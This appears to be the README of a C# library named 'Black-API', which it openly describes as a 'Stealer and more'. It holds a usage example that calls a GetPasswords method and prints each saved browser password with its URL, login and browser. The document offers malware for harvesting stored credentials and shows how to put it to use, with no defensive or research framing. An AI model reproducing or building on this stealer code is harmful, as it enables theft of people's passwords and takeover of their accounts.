# Black-API
Stealer and more

**Example:**
```C#
BlackAPI.Stealer stealer = new BlackAPI.Stealer();
var stealerresult = stealer.GetPasswords();
if (stealerresult.Work)
{
    foreach (var password in stealerresult.Passwords)
    {
        Console.WriteLine("Url: " + password.url);
        Console.WriteLine("Login: " + password.login);
        Console.WriteLine("Password: " + password.password);
        Console.WriteLine("Browser: " + password.browser);
    }
    Console.WriteLine("Total passwords: " + stealerresult.Passwords.Count);
}
else
{
    Console.WriteLine("Passwords not found");
}
```
